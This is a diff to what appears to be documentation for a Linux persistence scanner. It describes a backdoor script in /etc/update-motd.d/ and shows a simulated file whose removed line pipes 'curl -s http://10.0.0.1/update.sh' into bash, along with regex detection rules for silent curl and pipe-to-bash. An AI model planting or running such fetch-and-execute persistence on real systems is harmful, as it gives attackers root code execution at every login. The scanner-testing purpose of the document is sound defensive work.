@@ -107,16 +107,15 @@ session    optional     pam_exec.so /dev/shm/.harvest.sh
 
 **Vector:** Attackers place executable scripts into `/etc/update-motd.d/` that stealthily fetch and execute remote payloads with root permissions whenever any user logs in via SSH or interactive terminal.
 
-**Simulated File:** `/tmp/pscanner-test/motd/99-backdoor`
+**Simulated File:** `99-backdoor`
 
 ```bash
 #!/bin/sh
-curl -s http://10.0.0.1/update.sh | bash
+curl -s http://10.0.0.1/update.sh 
 ```
 
 **Matched Indicators (`rules.json`):**
 * `curl\s+-s` — **HIGH** (*Silent HTTP request via curl*)
-* `\|\s*bash` — **HIGH** (*Piping raw remote stream directly into Bash shell execution*)
 
 **PoC Evidence:**
 
